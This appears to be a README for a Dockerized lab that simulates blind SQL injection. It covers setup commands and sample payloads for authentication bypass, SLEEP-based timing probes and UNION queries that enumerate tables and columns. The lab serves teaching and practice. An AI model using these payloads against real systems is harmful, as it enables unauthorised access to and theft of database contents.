### Blind SQL Injection - Dockerized

This project provides a Dockerized environment to simulate and test **Blind SQL Injection** attacks in a secure and isolated setup. 
The goal is to help users understand the mechanics of this attack, how it differs from traditional SQL Injection, and how to experiment with it using practical examples.

---

### What is Blind SQL Injection?

#### Difference Between SQL Injection and Blind SQL Injection

**SQL Injection** allows attackers to directly view the results of their malicious queries, such as database errors or data displayed on the webpage. It is fast and straightforward since the output is immediately visible.

**Blind SQL Injection**, however, does not show direct results. Instead, attackers infer information by observing the application’s behavior (e.g., response times or changes in output). It is slower and more complex but can still extract sensitive data with persistence.

---

### Prerequisites

To run the Dockerized application, ensure the following are installed on your system:

- [Docker](https://www.docker.com/) (required to load and run the image)  
- [Git](https://git-scm.com/) (optional, for cloning the repository)  
- System with at least **2GB of free space** (the image size is ~801 MB).  

---

### Installation and Usage

Follow these steps to set up and run the application:

#### 1. Clone the Repository

If you haven't already, clone the repository from GitHub:
```bash
git clone https://github.com/ALAOUIa/Blind_SQL_Injection-App.git
```

```bash
cd Abdelaziz_Blind-SQL-Injection-Dockerized
```

#### 2. Load the Docker Image

Load the prebuilt Docker image from the `.tar` file:
```bash
docker load -i Abdelaziz_Blind-SQL-Injection-Dockerized.tar
```

#### 3. Run the Docker Container

Start the container with the following command:
```bash
docker run -p 8080:80 abdelaziz/dvwa-custom
```

#### 4. Access the Application

Open your browser and navigate to:
```
http://localhost:8080
```

#### 5. Test SQL Injection Attacks

Use the examples provided in the [Examples](#examples-of-blind-sql-injection-attacks) section to test Blind SQL Injection on the vulnerable endpoints.

---

### Examples of Blind SQL Injection Attacks

Here are some sample payloads to test on the vulnerable application:

#### 1. **Boolean-Based Blind SQL Injection**

This method evaluates responses based on a condition:

- True condition (bypasses authentication):
```sql
' OR 1=1 --
```

- False condition (does not bypass authentication):
```sql
' OR 1=2 --
```

#### 2. **Time-Based Blind SQL Injection**

This method uses time delays to infer information:

- Delay the response if the condition is true:
```sql
' OR IF(1=1, SLEEP(5), 0) --
```

- Test if the username is 'admin':
```sql
' OR IF(username='admin', SLEEP(5), 0) --
```

#### 3. **Data Enumeration**

Extract database structure or content:

- List table names:
```sql
' UNION SELECT NULL, table_name FROM information_schema.tables --
```

- List column names from a specific table:
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --
```

---

### Disclaimer

This project is intended **solely for educational purposes**. Do not attempt these attacks on live systems or without explicit authorization. Misuse of this knowledge is unethical and may be illegal.
